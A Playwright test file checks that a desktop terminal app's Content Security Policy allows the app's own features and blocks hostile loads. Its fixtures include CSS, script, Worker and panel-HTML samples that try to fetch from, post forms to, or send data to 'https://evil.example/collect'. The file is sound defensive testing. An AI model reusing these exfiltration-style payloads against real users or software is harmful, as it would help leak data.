import { readFileSync } from "node:fs";
import { expect, test } from "@playwright/test";
import type { Page } from "@playwright/test";
import { plugin, seedPlugins } from "./plugins-fixture";
import { openSettings, seedConfig } from "./settings-fixture";
import { openCommandPalette } from "./palette-fixture";

// The Content Security Policy of the desktop app (apps/desktop/src-tauri/tauri.conf.json) applied to
// the web build. The web build is the same page, so serving it with the policy of the app shows what
// the policy would stop in the real window: nothing the app does may be blocked, and what a mod or a
// file tries to load from the network must be. The policy is read from the config file itself, so
// the test cannot drift from what the app ships.

const conf = JSON.parse(
  readFileSync(new URL("../apps/desktop/src-tauri/tauri.conf.json", import.meta.url), "utf8"),
) as { app: { security: { csp: Record<string, string> } } };
const POLICY = Object.entries(conf.app.security.csp)
  .map(([directive, sources]) => `${directive} ${sources}`)
  .join("; ");

interface Violation {
  directive: string;
  blocked: string;
}
interface Hook {
  paneIds(): string[];
  setMod(name: string, text: string | null): void;
}
type CspWindow = Window & { __norenTest?: Hook; __violations?: Violation[] };

const WEB_IMAGES_KEY = "noren.web.images";
const WEB_MODS_KEY = "noren.web.mods";
const PICTURE = "fixtures/background.png";
const FIXTURE = readFileSync(new URL("./fixtures/background.png", import.meta.url));

/** Serves the page with the policy of the app and records every violation the page reports. */
async function underPolicy(page: Page, policy = POLICY): Promise<string[]> {
  const problems: string[] = [];
  page.on("pageerror", (error) => problems.push(`pageerror: ${error.message}`));
  page.on("console", (message) => {
    // The driver chats about the GPU in the console; only what the policy says matters here.
    if (/content security policy|refused to/i.test(message.text())) {
      problems.push(`console: ${message.text()}`);
    }
  });
  await page.route("**/*", async (route) => {
    if (route.request().resourceType() !== "document") return route.continue();
    const response = await route.fetch();
    await route.fulfill({
      response,
      headers: { ...response.headers(), "content-security-policy": policy },
    });
  });
  await page.addInitScript(() => {
    const seen: Violation[] = [];
    (window as CspWindow).__violations = seen;
    document.addEventListener("securitypolicyviolation", (event) => {
      seen.push({ directive: event.effectiveDirective, blocked: event.blockedURI });
    });
  });
  return problems;
}

const violations = (page: Page): Promise<Violation[]> =>
  page.evaluate(() => (window as CspWindow).__violations ?? []);

async function start(page: Page): Promise<void> {
  await page.goto("/");
  await expect
    .poll(() => page.evaluate(() => (window as CspWindow).__norenTest?.paneIds().length ?? 0))
    .toBe(1);
}

test("the policy is the strict one the app ships", () => {
  expect(POLICY).toContain("default-src 'none'");
  expect(POLICY).toContain("script-src 'self'");
  expect(POLICY).not.toContain("unsafe-eval");
  // The one door to a Worker (the plugins), and nothing else opened with it.
  expect(POLICY).toContain("worker-src blob:");
  // The panel of a plugin is a srcdoc frame, which needs no source: frame-src stays closed (NOR-F18-01d).
  expect(POLICY).toContain("frame-src 'none'");
  expect(POLICY).not.toMatch(/https?:\/\/(?!ipc\.localhost)/);
});

test("the app runs under the policy: terminal, palette, settings, mods and a picture raise no violation", async ({
  page,
}) => {
  const problems = await underPolicy(page);
  await page.addInitScript(
    ({ imagesKey, images, modsKey, mods }) => {
      window.localStorage.setItem(imagesKey, images);
      window.localStorage.setItem(modsKey, mods);
    },
    {
      imagesKey: WEB_IMAGES_KEY,
      images: JSON.stringify({ [PICTURE]: FIXTURE.toString("base64") }),
      modsKey: WEB_MODS_KEY,
      mods: JSON.stringify({
        "tint.css":
          "[data-nr-part='sidebar'] { background: rgb(10, 40, 20); } .xterm { outline: 1px solid red; }",
      }),
    },
  );
  await seedConfig(
    page,
    `{ "mods": ["tint.css"], "appearance": { "background": { "image": "${PICTURE}", "opacity": 0.3, "blur": 4 } } }`,
  );
  await start(page);

  // The picture is drawn from memory (a blob), a style element of a mod is in force, and a terminal
  // is on screen: the three things that need the relaxed or unusual sources of the policy.
  await expect(page.locator('[data-nr-part="background"]')).toHaveCount(1);
  expect(
    await page
      .locator('[data-nr-part="background"]')
      .evaluate((element) => getComputedStyle(element).backgroundImage),
  ).toMatch(/^url\("blob:/);
  await expect(page.locator("style[data-nr-mod='tint.css']")).toHaveCount(1);
  await expect(page.locator(".xterm").first()).toBeVisible();

  await openCommandPalette(page);
  await expect(page.getByRole("dialog", { name: /command palette/i })).toBeVisible();
  await page.keyboard.press("Escape");

  const settings = await openSettings(page);
  await settings.getByRole("button", { name: "Close", exact: true }).click();
  await page.getByRole("button", { name: "New space", exact: true }).click();
  await expect(page.getByRole("dialog", { name: "New space", exact: true })).toBeVisible();
  await page.keyboard.press("Escape");

  expect(await violations(page)).toEqual([]);
  expect(problems).toEqual([]);
});

test("what a mod tries to load from the network is blocked", async ({ page }) => {
  await underPolicy(page);
  const evil = "https://evil.example";
  const requested: string[] = [];
  // A request that the policy lets through would reach this route; a refused one never does.
  await page.route("https://evil.example/**", (route) => {
    requested.push(route.request().url());
    return route.abort();
  });
  await page.addInitScript(({ key, mods }) => window.localStorage.setItem(key, mods), {
    key: WEB_MODS_KEY,
    mods: JSON.stringify({
      "leak.css": [
        `@import url("${evil}/theme.css");`,
        `body { background-image: url("${evil}/pixel.png"); }`,
        `@font-face { font-family: Leak; src: url("${evil}/font.woff2"); }`,
        `.xterm { font-family: Leak, monospace; cursor: url("${evil}/cursor.png"), auto; }`,
        `[data-nr-part="sidebar"] { background: rgb(1, 2, 3); }`,
      ].join("\n"),
    }),
  });
  await seedConfig(page, `{ "mods": ["leak.css"] }`);
  await start(page);
  await expect(page.locator("style[data-nr-mod='leak.css']")).toHaveCount(1);
  // The rest of the mod still applies; only the loads are refused.
  await expect
    .poll(() =>
      page
        .locator('[data-nr-part="sidebar"]')
        .first()
        .evaluate((element) => getComputedStyle(element).backgroundColor),
    )
    .toBe("rgb(1, 2, 3)");

  await expect
    .poll(async () => (await violations(page)).filter((v) => v.blocked.includes(evil)).length)
    .toBeGreaterThanOrEqual(3);
  const blocked = await violations(page);
  const hostile = blocked.filter((v) => v.blocked.includes(evil));
  // The picture and the cursor are images, the face is a font. (`@import` cannot be a rule inside
  // the layer the mod is wrapped in, so it loads nothing at all.)
  expect(new Set(hostile.map((v) => v.directive))).toEqual(new Set(["img-src", "font-src"]));
  expect(requested).toEqual([]);
});

test("a page that tries to run a script or open a frame from the outside is refused", async ({
  page,
}) => {
  await underPolicy(page);
  await start(page);
  await page.evaluate(() => {
    const script = document.createElement("script");
    script.src = "https://evil.example/x.js";
    document.head.append(script);
    const inline = document.createElement("script");
    inline.textContent = "window.__ran = true";
    document.head.append(inline);
    const frame = document.createElement("iframe");
    frame.src = "https://evil.example/";
    document.body.append(frame);
    void fetch("https://evil.example/collect").catch(() => undefined);
  });
  await expect.poll(async () => (await violations(page)).length).toBeGreaterThanOrEqual(4);
  const directives = new Set((await violations(page)).map((v) => v.directive));
  // The inline script and the remote one are both elements; eval itself cannot be tried from here
  // (the test driver evaluates with the policy off), but the page raised none on its own above.
  for (const directive of ["script-src-elem", "frame-src", "connect-src"]) {
    expect(directives.has(directive), directive).toBe(true);
  }
  expect(await page.evaluate(() => "__ran" in window)).toBe(false);
});

test("inline styles are why style-src keeps unsafe-inline: the terminal writes a style element of its own", async ({
  page,
}) => {
  await underPolicy(page, POLICY.replace("style-src 'self' 'unsafe-inline'", "style-src 'self'"));
  await start(page);
  // xterm.js 6 puts a <style> inside every terminal (the colors of its scrollbar) and has no option
  // for a nonce; a mod is a <style> too. Without `unsafe-inline` both are refused.
  await expect
    .poll(async () => (await violations(page)).map((v) => v.directive))
    .toContain("style-src-elem");
  expect(await page.locator(".xterm style").count()).toBeGreaterThan(0);
});

test("a plugin runs under the policy: its Worker comes from a blob and opens a tab with no violation", async ({
  page,
}) => {
  const problems = await underPolicy(page);
  await start(page);
  const tabs = page
    .getByRole("tree", { name: "Tabs", exact: true })
    .locator('[data-nr-part="item"]');
  await expect(tabs).toHaveCount(1);

  await page.locator('[data-nr-part="pane"]:visible').click();
  await openCommandPalette(page);
  const palette = page.locator('[data-nr-part="palette"]');
  await expect(palette).toBeVisible();
  await palette
    .getByRole("combobox", { name: "Command palette", exact: true })
    .fill("example plugin");
  const entry = palette.locator('[data-nr-kind="plugin"]');
  await expect(entry).toHaveCount(1);
  await expect(entry.first()).toHaveAttribute("aria-selected", "true");
  await page.keyboard.press("Enter");
  await expect(tabs).toHaveCount(2);

  expect(await violations(page)).toEqual([]);
  expect(problems).toEqual([]);
});

test("a plugin cannot use eval, new Function, import a script or reach the network", async ({
  page,
}) => {
  await underPolicy(page);
  const requested: string[] = [];
  // A request that the policy lets through would reach this route; a refused one never does.
  await page.route("https://evil.example/**", (route) => {
    requested.push(route.request().url());
    return route.abort();
  });
  // The plugin tells what each attempt did by registering an action named after it.
  await seedPlugins(page, [
    plugin(
      "hostile",
      ["palette.actions"],
      `let n = 0;
const said = (text) => globalThis.postMessage({ version: 1, id: ++n, method: "palette.register", params: { id: "r" + n, label: text } });
const attempt = (name, run) => { try { run(); said(name + ": ran"); } catch (e) { said(name + ": blocked"); } };
attempt("eval", () => eval("1 + 1"));
attempt("function", () => new Function("return 1")());
attempt("import", () => importScripts("https://evil.example/x.js"));
attempt("worker", () => new Worker("https://evil.example/w.js"));
fetch("https://evil.example/collect").then(() => said("fetch: ran"), () => said("fetch: blocked"));
said("done: yes");`,
    ),
  ]);
  await start(page);
  await page.locator('[data-nr-part="pane"]:visible').click();
  await openCommandPalette(page);
  const palette = page.locator('[data-nr-part="palette"]');
  await expect(palette).toBeVisible();
  const results = palette.locator('[data-nr-kind="plugin"] .palette-title');
  await expect(results).toHaveCount(6);
  await expect(results).toHaveText([
    "eval: blocked",
    "function: blocked",
    "import: blocked",
    "worker: blocked",
    "done: yes",
    "fetch: blocked",
  ]);
  expect(requested).toEqual([]);
});

/** Opens the palette on a plugin action by its words and chooses it. */
async function choosePluginAction(page: Page, query: string): Promise<void> {
  await page.locator('[data-nr-part="pane"]:visible').click();
  await openCommandPalette(page);
  const palette = page.locator('[data-nr-part="palette"]');
  await expect(palette).toBeVisible();
  await palette.getByRole("combobox", { name: "Command palette", exact: true }).fill(query);
  const entry = palette.locator('[data-nr-kind="plugin"]');
  await expect(entry).toHaveCount(1);
  await expect(entry.first()).toHaveAttribute("aria-selected", "true");
  await page.keyboard.press("Enter");
  await expect(palette).toBeHidden();
}

const PANEL_FRAME = 'iframe[data-nr-part="plugin-panel-frame"]';

test("the panel of a plugin draws under the policy: a sandboxed frame by srcdoc, no violation of the page", async ({
  page,
}) => {
  const problems = await underPolicy(page);
  await start(page);
  await choosePluginAction(page, "show the panel");

  // The frame comes from `srcdoc`, so it needs no source in the policy (frame-src stays 'none').
  const inside = page.frameLocator(PANEL_FRAME);
  await expect(inside.getByRole("heading", { name: "Hello from the plugin" })).toBeVisible();
  await expect(inside.locator("#from-plugin")).toBeVisible();
  expect(await page.locator(PANEL_FRAME).getAttribute("sandbox")).toBe("");

  expect(await violations(page)).toEqual([]);
  expect(problems).toEqual([]);
});

test("the content of a panel cannot move its frame, send a form, run a script or load a thing under the policy", async ({
  page,
}) => {
  await underPolicy(page);
  const requested: string[] = [];
  // A request that the policy lets through would reach this route; a refused one never does.
  await page.route("https://evil.example/**", (route) => {
    requested.push(route.request().url());
    return route.abort();
  });
  const html =
    '<p id="marker" style="color: rgb(0, 120, 0)">kept</p>' +
    "<script>document.getElementById('marker').textContent = 'script ran'</script>" +
    "<img src=\"https://evil.example/pixel.png\" onerror=\"document.getElementById('marker').textContent = 'handler ran'\">" +
    '<link rel="stylesheet" href="https://evil.example/style.css">' +
    '<a id="link" href="https://evil.example/page">link</a>' +
    '<a id="top" target="_top" href="https://evil.example/top">top</a>' +
    '<form action="https://evil.example/form" method="post"><button id="send">send</button></form>' +
    '<meta http-equiv="refresh" content="0; url=https://evil.example/refresh">' +
    '<iframe src="https://evil.example/frame"></iframe>';
  await seedPlugins(page, [
    plugin(
      "hostile-panel",
      ["palette.actions", "panel"],
      `globalThis.postMessage({ version: 1, id: "reg", method: "palette.register", params: { id: "show", label: "Show hostile panel" } });
globalThis.onmessage = () => globalThis.postMessage({ version: 1, id: "panel", method: "panel.open", params: ${JSON.stringify({ title: "Hostile", html })} });`,
    ),
  ]);
  await start(page);
  await choosePluginAction(page, "show hostile panel");

  const inside = page.frameLocator(PANEL_FRAME);
  await expect(inside.locator("#marker")).toHaveCSS("color", "rgb(0, 120, 0)");
  // The button (no allow-forms) and the link to the top (no allow-top-navigation) do nothing.
  const url = page.url();
  await inside.locator("#send").click({ force: true });
  await inside.locator("#top").click({ force: true });
  await page.waitForTimeout(300);
  await expect(inside.locator("#marker")).toHaveText("kept");
  expect(page.url()).toBe(url);
  // A link that would move the frame itself is refused by the policy of the app (frame-src 'none'):
  // the page hears of it and the address is never requested.
  await inside.locator("#link").click({ force: true });
  await expect
    .poll(async () =>
      (await violations(page)).filter((v) => v.blocked.startsWith("https://evil.example")),
    )
    .not.toEqual([]);
  expect(page.url()).toBe(url);
  expect(requested).toEqual([]);
});

test("a plugin without the permission panel gets no frame under the policy either", async ({
  page,
}) => {
  const problems = await underPolicy(page);
  await seedPlugins(page, [
    plugin(
      "no-panel",
      ["palette.actions"],
      `globalThis.postMessage({ version: 1, id: "reg", method: "palette.register", params: { id: "show", label: "Show nothing" } });
globalThis.onmessage = () => globalThis.postMessage({ version: 1, id: "panel", method: "panel.open", params: { title: "No", html: "<p>no</p>" } });`,
    ),
  ]);
  await start(page);
  await choosePluginAction(page, "show nothing");
  await page.waitForTimeout(300);
  await expect(page.locator(PANEL_FRAME)).toHaveCount(0);
  await expect(page.locator('[data-nr-part="plugin-panel"]')).toHaveCount(0);
  expect(problems).toEqual([]);
});
